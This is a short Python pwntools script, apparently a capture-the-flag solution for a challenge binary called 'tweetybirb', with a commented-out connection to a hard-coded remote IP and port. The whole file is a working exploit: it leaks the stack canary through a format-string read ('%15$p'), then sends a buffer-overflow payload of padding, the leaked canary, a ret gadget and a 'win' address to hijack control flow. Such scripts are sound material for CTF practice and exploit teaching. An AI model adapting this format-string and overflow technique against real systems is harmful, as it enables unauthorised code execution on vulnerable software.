from pwn import *

win = 0x00000000004011db
ret = 0x0000000000401272
# canary -> %15$p

offset = 72

host = "143.198.184.186"
port = 5002

s = process("./tweetybirb")
# s = remote(host, port)

print(s.recvline().decode())

s.sendline(b"%15$p")

canary = int(s.recvline().decode(), 16)
log.info("Canary: {}".format(hex(canary)))
print(s.recvline().decode())

payload = b"A"*offset
payload += p64(canary)
payload += p64(ret)
payload += p64(win)

s.sendline(payload)

print(s.recvall())

s.close()
